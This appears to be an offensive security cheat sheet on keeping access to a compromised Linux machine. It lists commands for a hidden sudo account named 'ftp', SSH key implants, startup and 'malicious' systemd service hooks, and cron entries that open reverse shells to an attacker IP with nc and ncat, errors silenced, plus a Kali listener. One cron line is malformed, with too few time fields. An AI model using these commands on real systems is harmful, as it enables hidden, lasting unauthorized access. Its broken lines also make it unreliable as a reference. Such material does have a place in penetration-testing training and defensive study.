# Linux  Persistence

## **Persistence**

***

### **Creating Local Account**

***

Create a user with root privilege:

```jsx
sudo useradd -m -s /bin/bash ftp
```

Add the user to the sudo group to have administrative privileges:

```jsx
usermod -aG sudo ftp
```

Configure a password for the user "ftp":

```jsx
sudo passwd ftp
```

Check the user in the /etc/passwd file:

```jsx
cat /etc/passwd
```

### **Add a User with Sudo Privileges**

***

Create a new user

```jsx
sudo useradd -m -G sudo newuser
```

Set a password for the new user

```jsx
sudo passwd newuser
```

### **SSH Key Persistence**

***

Generate an SSH key pair

```jsx
ssh-keygen -t rsa
```

Copy the public key to the target user's authorized\_keys file

```jsx
ssh-copy-id -i ~/.ssh/id_rsa.pub user@target
```

### **Cron Job Persistence**

***

Edit the crontab

```jsx
ls -l /etc/crontab
crontab -e
```

Add a cron job (e.g., running a script at midnight)

```jsx
0 0 * * * /path/to/script.sh
```

Add a payload to run every minute

```jsx
* * * * nc -e /bin/sh <your-IP> <your-port>
```

Other payload (at reboot)

```jsx
(crontab -l; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash") | crontab 2> /dev/null
```

Set up a Netcat listener in Kali

```jsx
nc -nvlp <your-port>
```

### **Startup Script Persistence**

***

Add a command to run at startup (modify the rc.local file or systemd service, depending on your system)

```jsx
sudo nano /etc/rc.local
```

Add your command before the "exit 0" line.

### **Malicious Service Persistence**

***

Create a malicious service (for educational purposes only)

```jsx
sudo nano /etc/systemd/system/malicious.service
```

Add a malicious ExecStart command.

```jsx
[Service] ExecStart=/path/to/malicious/script
```

Enable and start the service

```jsx
sudo systemctl enable malicious.service sudo systemctl start malicious.service
```
